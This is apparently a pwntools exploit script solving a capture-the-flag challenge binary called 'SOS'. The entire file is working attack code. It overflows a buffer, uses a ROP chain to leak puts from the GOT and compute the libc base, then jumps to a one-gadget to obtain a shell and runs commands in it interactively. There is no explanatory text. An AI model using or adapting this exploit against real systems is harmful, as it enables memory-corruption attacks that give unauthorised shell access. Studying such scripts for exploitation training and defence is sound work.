from pwn import *

bin = ELF("SOS")
libc = ELF("libc-2.27.so")
p = bin.process()

context.terminal = ["terminator","-e"]
context.log_level = "debug"

def Debug(cmd=""):
    gdb.attach(p,cmd)
    pause()

pop_rdi_ret = 0x0000000000400c53 # pop rdi ; ret
pop_rsi_r15_ret = 0x0000000000400c51 # pop rsi ; pop r15 ; ret

payload = cyclic(0x38)
payload += p64(pop_rdi_ret)
payload += p64(bin.got["puts"])
payload += p64(bin.plt["puts"])
payload += p64(0x400afc)
p.sendlineafter("size: \n","0")
p.sendlineafter("code: \n",payload)
while True:
    libc_address = p.recvline(timeout=1).strip()
    p.info('receiving..')
    if len(libc_address) > 4:
        break
    p.send('0' * 0x1000)
libc.address = u64(libc_address.ljust(8,"\x00"))-0x72a40
success("libc.address-->"+hex(libc.address))
p.sendlineafter("size: \n","0")
p.sendlineafter("code: \n",cyclic(0x38)+p64(libc.address+0x45200))
for i in range(3):
    recved = p.recvline(timeout=1)
    p.info('sending..')
    if len(recved) > 4:
        break
    p.send('ls;' + '\x00' * 0x1000)
p.interactive()